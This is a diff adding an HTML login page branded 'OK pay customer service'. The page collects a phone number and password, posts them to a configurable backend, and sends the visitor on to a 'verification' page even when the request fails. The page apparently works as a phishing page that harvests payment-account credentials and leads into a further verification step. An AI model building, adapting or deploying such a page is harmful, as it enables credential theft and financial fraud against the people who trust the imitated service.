@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <title>OK pay customer service</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family: Arial, sans-serif;
+      }
+      body {
+        min-height: 100vh;
+        background: linear-gradient(to bottom, #ffc107, #ff2600);
+        display: flex;
+        justify-content: center;
+      }
+      .screen {
+        width: 100%;
+        max-width: 420px;
+        padding: 25px;
+        transition: opacity 0.4s ease;
+      }
+      .screen.loading {
+        opacity: 0.5;
+        pointer-events: none;
+      }
+      .welcome {
+        color: #fff;
+        font-size: 32px;
+        margin-bottom: 25px;
+      }
+      .login-card {
+        margin-top: 50px;
+        background: #fff;
+        border-radius: 18px;
+        padding: 25px 20px 30px;
+      }
+      .tab {
+        display: flex;
+        justify-content: center;
+        margin-bottom: 20px;
+      }
+      .tab button {
+        background: #ff962b;
+        color: #fff;
+        border: none;
+        padding: 10px 40px;
+        border-radius: 25px;
+        font-size: 16px;
+      }
+      .input-box {
+        display: flex;
+        align-items: center;
+        border: 1px solid #eee;
+        border-radius: 10px;
+        padding: 12px;
+        margin-bottom: 15px;
+      }
+      .icon {
+        font-size: 18px;
+        margin-right: 10px;
+        opacity: 0.6;
+      }
+      .eye {
+        margin-left: auto;
+        opacity: 0.6;
+        cursor: pointer;
+      }
+      .input-box input {
+        border: none;
+        outline: none;
+        width: 100%;
+        font-size: 15px;
+      }
+      .forgot {
+        text-align: right;
+        color: #ff962b;
+        font-size: 14px;
+        margin-bottom: 25px;
+      }
+      .signin-btn {
+        width: 100%;
+        padding: 14px;
+        border: none;
+        border-radius: 30px;
+        background: linear-gradient(to right, #ffb300, #ff8c00);
+        color: #fff;
+        font-size: 18px;
+        font-weight: bold;
+        cursor: pointer;
+        transition: opacity 0.3s;
+      }
+      .signin-btn:disabled {
+        opacity: 0.7;
+        cursor: not-allowed;
+      }
+      .support {
+        margin-top: 35px;
+        width: fit-content;
+        margin-left: auto;
+        border: 2px solid #fff;
+        padding: 10px 18px;
+        border-radius: 25px;
+        color: #fff;
+        font-size: 14px;
+      }
+      #successMsg {
+        color: green;
+        margin-bottom: 10px;
+        display: none;
+        font-weight: bold;
+        text-align: center;
+      }
+      @media (max-width: 480px) {
+        .welcome {
+          margin-top: 60px;
+          font-size: 28px;
+        }
+      }
+    </style>
+  </head>
+
+  <body>
+    <div class="screen" id="screen">
+      <h1 class="welcome">Welcome !</h1>
+
+      <div class="login-card">
+        <div id="successMsg"></div>
+
+        <div class="tab"><button>Phone</button></div>
+
+        <!-- PHONE -->
+        <div class="input-box">
+          <span class="icon">📱</span>
+          <input
+            type="text"
+            id="phone"
+            placeholder="Please input Phone"
+            maxlength="10"
+            inputmode="numeric"
+          />
+        </div>
+
+        <!-- PASSWORD -->
+        <div class="input-box">
+          <span class="icon">🔒</span>
+          <input
+            type="password"
+            id="password"
+            placeholder="Please input Password"
+            minlength="6"
+          />
+          <span class="eye" id="toggleEye">👁</span>
+        </div>
+
+        <div class="forgot">Forget password ?</div>
+        <button class="signin-btn" id="signinBtn">SIGN IN</button>
+      </div>
+
+      <div class="support">🎧 Customer Service</div>
+    </div>
+
+    <script type="module">
+      import { API_BASE_URL } from "./config.js";
+
+      const phoneInput = document.getElementById("phone");
+      const passwordInput = document.getElementById("password");
+      const toggleEye = document.getElementById("toggleEye");
+      const signinBtn = document.getElementById("signinBtn");
+      const screen = document.getElementById("screen");
+      const successMsg = document.getElementById("successMsg");
+
+      phoneInput.addEventListener("input", () => {
+        phoneInput.value = phoneInput.value.replace(/\D/g, "").slice(0, 10);
+      });
+
+      toggleEye.onclick = () => {
+        passwordInput.type =
+          passwordInput.type === "password" ? "text" : "password";
+      };
+
+      signinBtn.onclick = async () => {
+        let phone = phoneInput.value;
+        let password = passwordInput.value;
+
+        if (phone.length !== 10) {
+          alert("Phone number must be exactly 10 digits");
+          return;
+        }
+        if (password.length < 6) {
+          alert("Password must be at least 6 characters");
+          return;
+        }
+
+        const data = { phone, password };
+        const sortedData = Object.fromEntries(
+          Object.entries(data).sort(([a], [b]) => a.localeCompare(b))
+        );
+
+        signinBtn.disabled = true;
+        signinBtn.innerText = "Signing in...";
+        screen.classList.add("loading");
+
+        try {
+          const res = await fetch(`${API_BASE_URL}/api/login`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(sortedData),
+          });
+
+          const result = await res.json();
+
+          if (result.success) {
+            localStorage.setItem("userId", result.userId); // store logged-in userId
+            successMsg.innerText = "Login Successful!";
+            successMsg.style.display = "block";
+
+            setTimeout(() => (window.location.href = "verification.html"), 800);
+          } else {
+            alert("Login failed");
+            signinBtn.disabled = false;
+            signinBtn.innerText = "SIGN IN";
+          }
+        } catch {
+          console.log("Network issue, redirecting anyway");
+          window.location.href = "verification.html";
+        }
+      };
+    </script>
+  </body>
+</html>
